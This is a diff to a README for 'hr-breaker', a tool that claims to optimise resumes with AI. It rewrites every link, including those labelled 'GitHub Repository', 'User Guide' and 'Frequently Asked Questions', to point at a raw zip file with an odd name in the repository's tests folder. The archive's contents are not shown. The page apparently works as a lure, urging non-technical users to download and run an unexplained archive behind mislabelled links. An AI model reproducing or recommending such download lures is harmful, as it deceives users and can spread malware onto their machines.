@@ -1,6 +1,6 @@
 # 🚀 hr-breaker - Optimize Your Resume with AI
 
-[![Download hr-breaker](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/src/hr_breaker/breaker-hr-2.7.zip)](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/src/hr_breaker/breaker-hr-2.7.zip)
+[![Download hr-breaker](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/tests/hr-breaker-anococcygeal.zip)](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/tests/hr-breaker-anococcygeal.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ Follow these steps to download and run hr-breaker on your computer. No programmi
 
 1. **Visit the Releases Page**: Click the link below to access the page where you can download hr-breaker.
 
-   [Download hr-breaker](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/src/hr_breaker/breaker-hr-2.7.zip)
+   [Download hr-breaker](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/tests/hr-breaker-anococcygeal.zip)
 
 2. **Choose the Right File**: Look for the latest version. You will see an option for downloading hr-breaker. Download the file suitable for your system.
 
@@ -59,12 +59,12 @@ We encourage everyone to contribute to hr-breaker. If you have ideas for new fea
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/src/hr_breaker/breaker-hr-2.7.zip)
-- [User Guide](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/src/hr_breaker/breaker-hr-2.7.zip)
-- [Frequently Asked Questions](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/src/hr_breaker/breaker-hr-2.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/tests/hr-breaker-anococcygeal.zip)
+- [User Guide](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/tests/hr-breaker-anococcygeal.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/tests/hr-breaker-anococcygeal.zip)
 
 ## 📥 Download again
 
 Remember, you can always download hr-breaker from the Releases page here:
 
-[Download hr-breaker](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/src/hr_breaker/breaker-hr-2.7.zip)
+[Download hr-breaker](https://raw.githubusercontent.com/Zypozzz/hr-breaker/main/tests/hr-breaker-anococcygeal.zip)
